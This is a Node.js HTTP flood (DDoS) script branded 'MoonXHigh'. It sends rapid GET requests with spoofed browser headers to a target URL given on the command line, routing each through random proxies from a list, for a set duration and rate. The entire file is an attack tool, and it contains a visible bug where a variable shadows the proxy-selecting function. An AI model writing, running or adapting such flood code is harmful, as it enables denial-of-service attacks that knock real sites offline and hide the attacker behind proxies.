const axios = require("axios");
const fs = require("fs");

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const rps = parseInt(process.argv[4]); 
const rate = parseInt(process.argv[5]);
const threads = parseInt(process.argv[6])
const proxyFile = "./methods/proxy.txt";

const proxies = fs.readFileSync(proxyFile, "utf-8").trim().split("\n");

function proxy() {
    return proxies[Math.floor(Math.random() * proxies.length)];
}

async function attack(proxy) {
    try {
        const [host, port] = proxy.split(":");

        await axios.get(target, {
            proxy: {
                host,
                port: parseInt(port)
            },
            timeout: 3000,
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            }
        });

        console.log(`MoonXHigh ${target} via ${proxy}`);
    } catch (err) {
        console.log(err);
    }
}

async function flood() {
    const interval = 1000 / rps;
    const endTime = Date.now() + time * 1000;

    console.log(` MoonXHigh Attack Started!`);
    console.log(` Target : ${target}`);
    console.log(` Duration : ${time}s`);
    console.log(` RPS : ${rps}`);
    console.log(` Threads : ${threads}`);
    console.log(` Proxy Loaded : ${proxies.length}`);

    while (Date.now() < endTime) {
        for (let i = 0; i < threads; i++) {
            const proxy = proxy();
            attack(proxy);
        }
        await new Promise(r => setTimeout(r, interval));
    }

    console.log(`MoonXHigh Attack Finished!`);
}

flood();
